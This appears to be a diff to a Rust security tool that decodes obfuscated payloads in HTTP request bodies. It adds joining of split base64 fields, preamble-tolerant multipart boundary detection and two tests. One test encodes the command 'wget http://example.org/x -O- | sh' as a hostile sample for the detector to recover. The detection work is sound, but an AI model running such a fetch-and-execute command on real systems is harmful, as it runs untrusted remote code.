@@ -240,7 +240,7 @@ fn add(
         if kind == LayerKind::Php
             && matches!(
                 l.kind,
-                LayerKind::Base64 | LayerKind::Gzip | LayerKind::Hex | LayerKind::Escapes
+                LayerKind::Base64 | LayerKind::Compressed | LayerKind::Hex | LayerKind::Escapes
             )
         {
             l.kind = LayerKind::Php;
@@ -253,7 +253,7 @@ fn add(
             l.text == bytes
                 && matches!(
                     l.kind,
-                    LayerKind::Base64 | LayerKind::Gzip | LayerKind::Hex | LayerKind::Escapes
+                    LayerKind::Base64 | LayerKind::Compressed | LayerKind::Hex | LayerKind::Escapes
                 )
         })
     {
@@ -339,7 +339,8 @@ pub(super) fn form_fields(text: &[u8], layer: usize) -> Vec<Field> {
 }
 
 /// Add the fields as layers, folding runs of random-padding fields into
-/// their first.
+/// their first. A run whose values read as one payload when joined is that
+/// payload, split to look like padding: it is kept as one layer, joined.
 fn emit_fields(
     xray: &mut Xray,
     parent: usize,
@@ -358,6 +359,20 @@ fn emit_fields(
         }
         let run = padding_run(&fields[i..]);
         let f = &fields[i];
+        if run >= COLLAPSE_MIN {
+            let values = fields[i..i + run].iter();
+            let joined: Vec<u8> = values.flat_map(|f| f.value.iter().copied()).collect();
+            if opens(&joined) {
+                let span = Span {
+                    end: fields[i + run - 1].span.end,
+                    ..f.span
+                };
+                let name = Some(f.name.clone());
+                add(xray, parent, kind, Some(span), joined, name, 0, budget);
+                i += run;
+                continue;
+            }
+        }
         add(
             xray,
             parent,
@@ -545,7 +560,7 @@ fn multipart(xray: &mut Xray, parent: usize, text: &[u8], budget: &mut Budget) {
         .take(MAX_PARTS + 1)
         .map(|m| m.start())
         .collect();
-    let boundary = text_boundary(text);
+    let boundary = text_boundary(&text[..starts.first().copied().unwrap_or(0)]);
     let mut fields = Vec::new();
     let mut names = Vec::new();
     for (n, &s) in starts.iter().enumerate() {
@@ -601,13 +616,16 @@ fn multipart(xray: &mut Xray, parent: usize, text: &[u8], budget: &mut Budget) {
     }
 }
 
-/// The boundary line (with its dashes) when the text opens with one.
-fn text_boundary(text: &[u8]) -> Option<&[u8]> {
-    let (start, _) = trim(text);
-    let line = text[start..].split(|&b| b == b'\n').next()?;
-    let line = line.strip_suffix(b"\r").unwrap_or(line);
-    (line.starts_with(b"--") && line.len() > 2 && !line.iter().any(u8::is_ascii_whitespace))
-        .then_some(line)
+/// The boundary line (with its dashes) of the first part, from the text in
+/// front of that part: the nearest line shaped like one, as a preamble may
+/// hold anything.
+fn text_boundary(before: &[u8]) -> Option<&[u8]> {
+    let lines = before.rsplit(|&b| b == b'\n');
+    lines
+        .map(|line| line.strip_suffix(b"\r").unwrap_or(line))
+        .find(|line| {
+            line.starts_with(b"--") && line.len() > 2 && !line.iter().any(u8::is_ascii_whitespace)
+        })
 }
 
 /// Length of a part's content: up to the trailing boundary line, minus the
@@ -875,8 +893,12 @@ fn php_calls(xray: &mut Xray, parent: usize, text: &[u8], budget: &mut Budget) {
             let limit = budget.output.min(inflate_left);
             let step = match name.as_str() {
                 "base64_decode" => decode::base64_lenient(&bytes).map(|b| (b, LayerKind::Base64)),
-                "gzinflate" => decode::inflate_raw(&bytes, limit).map(|b| (b, LayerKind::Gzip)),
-                "gzuncompress" => decode::inflate_zlib(&bytes, limit).map(|b| (b, LayerKind::Gzip)),
+                "gzinflate" => {
+                    decode::inflate_raw(&bytes, limit).map(|b| (b, LayerKind::Compressed))
+                }
+                "gzuncompress" => {
+                    decode::inflate_zlib(&bytes, limit).map(|b| (b, LayerKind::Compressed))
+                }
                 "hex2bin" => decode::hex_bytes(&bytes).map(|b| (b, LayerKind::Hex)),
                 "str_rot13" => Some((rot13(&bytes), LayerKind::Escapes)),
                 "strrev" => Some((bytes.iter().rev().copied().collect(), LayerKind::Escapes)),
@@ -899,7 +921,7 @@ fn php_calls(xray: &mut Xray, parent: usize, text: &[u8], budget: &mut Budget) {
                 bytes.clear();
                 break;
             };
-            if matches!(k, LayerKind::Gzip) {
+            if matches!(k, LayerKind::Compressed) {
                 inflate_left = inflate_left.saturating_sub(next.len());
             }
             bytes = next;
@@ -1190,6 +1212,32 @@ mod tests {
         );
         let x = request(None, Some(body.as_bytes()));
         assert!(has_text(&x, b"Some hidden payload here"));
+    }
+
+    #[test]
+    fn a_preamble_leaves_no_boundary_in_the_fields() {
+        let body = b"some words\r\n--note\r\n--b\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\nhello\r\n--b\r\nContent-Disposition: form-data; name=\"c\"\r\n\r\nworld\r\n--b--\r\n";
+        let x = request(None, Some(body));
+        assert!(find_layer(&x, LayerKind::MultipartField, b"hello").is_some());
+        assert!(find_layer(&x, LayerKind::MultipartField, b"world").is_some());
+    }
+
+    #[test]
+    fn a_payload_split_over_padding_fields_is_joined() {
+        let plain = b"wget http://example.org/x -O- | sh;       ";
+        let text = data_encoding::BASE64.encode(plain);
+        assert!(text.bytes().all(|b| b.is_ascii_alphanumeric()), "{text}");
+        let fields: Vec<String> = text
+            .as_bytes()
+            .chunks(14)
+            .enumerate()
+            .map(|(n, c)| format!("p{n}={}", String::from_utf8_lossy(c)))
+            .collect();
+        let x = request(None, Some(fields.join("&").as_bytes()));
+        assert!(has_text(&x, plain), "{:?}", x.layers);
+        let joined = find_layer(&x, LayerKind::Form, text.as_bytes()).expect("joined");
+        assert_eq!(joined.collapsed, 0);
+        assert_eq!(joined.name.as_deref(), Some(&b"p0"[..]));
     }
 
     #[test]
